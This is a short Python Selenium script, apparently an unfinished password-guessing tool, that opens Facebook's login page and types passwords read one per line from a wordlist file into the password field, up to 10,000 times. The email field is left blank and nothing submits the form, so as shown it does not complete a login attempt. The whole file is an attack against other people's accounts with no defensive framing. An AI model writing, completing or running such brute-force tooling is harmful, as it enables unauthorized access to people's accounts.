from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
x = 0
dosya = open("wordlist.txt","r")

f = dosya.readline()

driver = webdriver.Chrome()
while x < 10000:
    url = "https://www.facebook.com/"
    driver.maximize_window()
    driver.get(url)

    search = driver.find_element_by_name("email")
    search.send_keys("")

    search = driver.find_element_by_name("pass")
    search.send_keys(f"{f}")

    f = dosya.readline()


